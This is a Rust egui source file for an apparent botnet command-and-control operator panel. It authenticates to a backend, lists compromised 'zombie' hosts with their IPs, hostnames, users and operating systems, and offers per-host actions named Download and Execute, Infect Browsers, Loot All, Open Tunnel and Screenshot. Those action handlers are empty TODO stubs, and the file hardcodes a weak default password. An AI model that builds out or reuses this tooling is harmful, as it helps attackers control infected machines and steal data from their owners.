use std::process::id;

use eframe::{egui, glow::NONE};
use egui::{LayerId, Response};
use serde::Deserialize;
use serde_json::json;
use sqlx::types::ipnetwork::IpNetwork;

enum Tab {
    Zombies,
    Logs,
    Settings,
}

#[derive(Deserialize)]
pub struct LoginResponse {
    pub token: String,
}

#[derive(Deserialize)]
struct ZombieRow {
    id: String,
    internal_ip: Option<IpNetwork>,
    external_ip: Option<IpNetwork>,
    hostname: Option<String>,
    username: Option<String>,
    operating_system: Option<String>,
}

#[derive(Deserialize)]
struct ZombieUpdateResponse {
    data: Vec<ZombieRow>,
}

#[derive(serde::Deserialize, serde::Serialize)]
#[serde(default)]
pub struct App {
    #[serde(skip)]
    needs_update: bool,

    #[serde(skip)]
    tab: Tab,

    #[serde(skip)]
    selected_row: Option<usize>,

    #[serde(skip)]
    context_menu_id: Option<usize>,

    #[serde(skip)]
    zombies: Vec<ZombieRow>,

    #[serde(skip)]
    response: Option<Response>,

    backend_url: String,
    username: String,
    password: String,
    access_token: String,
    status_message: String,
    zombie_message: String,
}

impl Default for App {
    fn default() -> Self {
        Self {
            needs_update: true,
            tab: Tab::Zombies,
            selected_row: None,
            context_menu_id: None,
            zombies: vec![],
            response: None,
            backend_url: "https://localhost:3000/api".to_owned(),
            username: "User".to_owned(),
            password: "123456".to_owned(),
            access_token: "".to_owned(),
            status_message: "Not logged in!".to_owned(),
            zombie_message: "".to_owned(),
        }
    }
}

impl App {
    pub fn new(cc: &eframe::CreationContext<'_>) -> Self {
        if let Some(storage) = cc.storage {
            return eframe::get_value(storage, eframe::APP_KEY).unwrap_or_default();
        }
        Default::default()
    }
}

impl eframe::App for App {
    fn save(&mut self, storage: &mut dyn eframe::Storage) {
        eframe::set_value(storage, eframe::APP_KEY, self);
    }

    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        egui::TopBottomPanel::top("top_panel").show(ctx, |ui| {
            egui::menu::bar(ui, |ui| {
                ui.menu_button("Zombies", |_ui| {
                    self.tab = Tab::Zombies;
                });
                ui.menu_button("Logs", |_ui| {
                    self.tab = Tab::Logs;
                });
                ui.menu_button("Settings", |_ui| {
                    self.tab = Tab::Settings;
                });
            });
        });

        egui::CentralPanel::default().show(ctx, |ui| {
            match self.tab {
                Tab::Zombies => zombies_ui(ui, self),
                Tab::Logs => logs_ui(ui),
                Tab::Settings => settings_ui(ui, self),
            }
        });
    }
}

impl App {
    fn selectable_row(&mut self, ui: &mut egui::Ui, index: usize, row: &Vec<String>) {
        let selected = self.selected_row == Some(index);
        
        for col_text in row.iter() {
            let (rect, response) = ui.allocate_exact_size([100.0, 15.0].into(), egui::Sense::click());
            ui.painter().text(
                rect.left_center(),
                egui::Align2::LEFT_CENTER,
                col_text,
                egui::FontId::default(),
                ui.visuals().text_color(),
            );

            if response.clicked() {
                self.selected_row = Some(index);
            }

            if selected {
                ui.painter().rect_stroke(rect, 0.0, (1.0, egui::Color32::LIGHT_BLUE));
            }

            if response.secondary_clicked() {
                self.selected_row = Some(index);
                self.context_menu_id = Some(index);
                self.response = Some(response);
                //let popup_id = egui::Id::new(index);
                //ui.ctx().memory().toggle_popup(popup_id);
            }
        }
    }
}

fn zombies_ui(ui: &mut egui::Ui, app: &mut App) {

    if ui.button("Update Zombie List").clicked() {
        app.needs_update = true;
    }

    ui.label(&app.zombie_message);
    
   // static header
   egui::Grid::new("zm_header")
   .num_columns(7)
   .min_col_width(100.0)
   .max_col_width(100.0)
   .striped(false)
   .show(ui, |ui| {
       ui.label(egui::RichText::new("INT. IP").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       ui.label(egui::RichText::new("EXT. IP").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       ui.label(egui::RichText::new("HOSTNAME").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       ui.label(egui::RichText::new("USER").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       ui.label(egui::RichText::new("OS").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       //ui.label(egui::RichText::new("STATUS").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       ui.label(egui::RichText::new("Action").color(egui::Color32::LIGHT_BLUE).text_style(egui::TextStyle::Button));
       ui.end_row();
   });
   
   // dynamic user list
   egui::ScrollArea::vertical()
   .max_width(f32::INFINITY)
   .auto_shrink(false)
   .show(ui, |ui| {
       egui::Grid::new("zombies")
           .num_columns(7)
           .min_col_width(100.0)
           .max_col_width(100.0)
           .striped(true)
           .show(ui, |ui| {
                if app.needs_update && app.access_token.len() > 1 {
                    let http_client = reqwest::blocking::Client::new();
                    let res = http_client.get(format!("{}/update", app.backend_url))
                        .bearer_auth(&app.access_token)
                        .send();

                    if res.is_ok() {
                        let res = res.unwrap().json();

                        if res.is_ok() {
                            let updated: ZombieUpdateResponse = res.unwrap();

                            app.zombies = updated.data;
                            app.needs_update = false;
                            app.zombie_message = "Zombies updated!".to_owned();
                        } else {
                            app.needs_update = false;
                            app.zombie_message = format!("Failed: {}", res.err().unwrap().to_string());
                        }
                    } else {
                        app.needs_update = false;
                        app.zombie_message = "Connection to backend failed! Refresh the Token under 'Settings'!".to_owned();
                    }
                }

               //zombies
               let mut i: usize = 0;
               let app_ref = & app;

               for z in &app_ref.zombies {
                    let internal_ip: String = match z.internal_ip {
                        Some(net) => net.ip().to_string(),
                        None => "".to_string(),
                    };
                    
                    let external_ip: String = match z.external_ip {
                        Some(net) => net.ip().to_string(),
                        None => "".to_string(),
                    };

                    let row = vec![ 
                        internal_ip.clone(),
                        external_ip.clone(),
                        z.hostname.clone().unwrap_or("-".to_string()),
                        z.username.clone().unwrap_or("-".to_string()),
                        z.operating_system.clone().unwrap_or("-".to_string()),
                        //"ONLINE".to_string(),
                    ];
                    
                    for col_text in row.iter() {
                        let (rect, _response) = ui.allocate_exact_size([100.0, 15.0].into(), egui::Sense::click());
                        ui.painter().text(
                            rect.left_center(),
                            egui::Align2::LEFT_CENTER,
                            col_text,
                            egui::FontId::default(),
                            ui.visuals().text_color(),
                        );
                    }
                    
                    ui.menu_button("Action", |ui| {
                        if ui.button("Open SSH").clicked() {
                            //TODO: Handle Option 2 click
                            ui.close_menu();
                        }
                        if ui.button("Close SSH").clicked() {
                            //TODO: Handle Option 2 click
                            ui.close_menu();
                        }
                        if ui.button("Open Tunnel").clicked() {
                            //TODO: Handle Option 2 click
                            ui.close_menu();
                        }
                        if ui.button("Close Tunnels").clicked() {
                            //TODO: Handle Option 2 click
                            ui.close_menu();
                        }
                        ui.separator();
                        if ui.button("Download and Execute").clicked() {
                            //TODO: Handle Option 2 click
                            ui.close_menu();
                        }
                        if ui.button("Infect Browsers").clicked() {
                            //TODO: Handle Option 2 click
                            ui.close_menu();
                        }
                        if ui.button("Screenshot").clicked() {
                            //TODO: Handle Option 2 click
                            ui.close_menu();
                        }
                        if ui.button("Loot All").clicked() {
                            //TODO: Handle Option 2 click
                            ui.close_menu();
                        }
                        ui.separator();
                        if ui.button("Sleep").clicked() {
                            //TODO: Handle Option 1 click
                            ui.close_menu();
                        }
                        if ui.button("Uninstall").clicked() {
                            //TODO: Handle Option 2 click
                            ui.close_menu();
                        }
                    });
                    i = i+1;
                    ui.end_row();
                }
           });
   });
}

fn settings_ui(ui: &mut egui::Ui, app: &mut App) {
    ui.heading("Backend Connection:").highlight();

    ui.horizontal(|ui| {
        ui.label("Backend URL: ");
        ui.text_edit_singleline(&mut app.backend_url);
    });

    ui.horizontal( |ui| {
        ui.label("Username: ");
        ui.text_edit_singleline(&mut app.username);
    });

    ui.horizontal( |ui| {
        ui.label("Password: ");
        ui.text_edit_singleline(&mut app.password);
    });

    if ui.button("Authorize").clicked() {
        let http_client = reqwest::blocking::Client::new();
        let url_base = &app.backend_url;
        let json = json!({
            "username": app.username,
            "password": app.password,
        });
        let res = http_client.post(format!("{}/login", url_base))
                .json(&json)
                .send();
        
        if res.is_ok(){
            let res = res.unwrap().json();

            if res.is_ok() {
                let res: LoginResponse = res.unwrap();
                app.access_token = res.token;
                app.status_message = format!(" Token: [{}]", &app.access_token);
            } else {
                app.status_message = "Login failed!".to_owned();
            }
        } else {
            app.status_message = "URL not reachable!".to_owned();
        }
    }

    ui.label(&app.status_message);
}

fn logs_ui(ui: &mut egui::Ui) {
}